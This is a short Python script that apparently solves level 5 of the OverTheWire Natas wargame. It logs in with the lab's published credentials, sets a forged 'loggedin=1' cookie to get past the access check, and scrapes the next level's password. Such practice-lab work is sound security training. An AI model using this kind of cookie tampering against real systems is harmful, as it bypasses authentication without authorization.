import requests
import re

from requests.models import Response

username = "natas5"
password = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
url = "http://%s.natas.labs.overthewire.org/" % username
#adding a cookie dictionary (since cookie number is 0 , changing it to 1 might give the flag !)
cookie_number = {"loggedin":"1"}

#getting the session id
session_id = requests.Session()
response = session_id.get(url,auth=(username,password),cookies=cookie_number)
flag = response.text
flag = re.findall("Access granted. The password for natas6 is (.*)</div>",flag)
print(flag)
print(session_id.cookies)